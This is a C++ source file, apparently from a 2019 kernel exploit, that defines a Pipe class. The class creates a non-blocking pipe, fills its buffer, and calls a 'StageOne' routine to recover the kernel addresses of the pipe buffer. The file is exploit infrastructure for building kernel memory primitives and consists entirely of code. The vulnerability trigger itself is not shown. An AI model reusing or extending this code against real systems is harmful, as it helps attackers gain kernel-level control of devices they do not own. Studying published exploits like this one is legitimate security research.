// <3 nedwill 2019
#include "pipe.h"

#include <fcntl.h>
#include <unistd.h>

#include "stage1.h"

Pipe::Pipe(size_t buffer_size, uint64_t fd_ofiles)
    : should_read_(false), buffer_size_(buffer_size) {
  int pipefds[2];
  if (pipe(pipefds) < 0) {
    printf("failed to make pipes\n");
    valid_ = false;
    return;
  }

  read_fd_ = pipefds[0];
  write_fd_ = pipefds[1];
  if (read_fd_ == write_fd_) {
    printf("Pipe: read_fd_ == write_fd_\n");
    valid_ = false;
    return;
  }

  fcntl(write_fd_, F_SETFL, fcntl(write_fd_, F_GETFL) | O_NONBLOCK);

  buffer_.reset(new uint8_t[buffer_size]);
  ClearBuffer();
  if (!Write()) {
    printf("Pipe: failed to write in constructor\n");
    valid_ = false;
    return;
  }

  StageOne stage_one;
  if (!stage_one.GetPipebufferAddr(fd_ofiles, read_fd_, &buffer_ptr_kaddr_,
                                   &buffer_kaddr_)) {
    printf("Pipe constructor failed to get pipebuffer addr\n");
    valid_ = false;
    return;
  }

  valid_ = true;
}

Pipe::~Pipe() {
  close(read_fd_);
  close(write_fd_);
}

bool Pipe::Read() {
  if (!should_read_) {
    printf("Pipe::Read called when we are expected to write\n");
    return false;
  }
  should_read_ = false;

  ssize_t bytes_read = read(read_fd_, buffer_.get(), buffer_size_ - 1);
  return bytes_read == buffer_size_ - 1;
}

bool Pipe::Write() {
  if (should_read_) {
    printf("Pipe::Write called when we are expected to write\n");
    return false;
  }
  should_read_ = true;

  ssize_t bytes_written = write(write_fd_, buffer_.get(), buffer_size_ - 1);
  return bytes_written == buffer_size_ - 1;
}

void Pipe::ClearBuffer() { memset(buffer_.get(), 0, buffer_size_); }
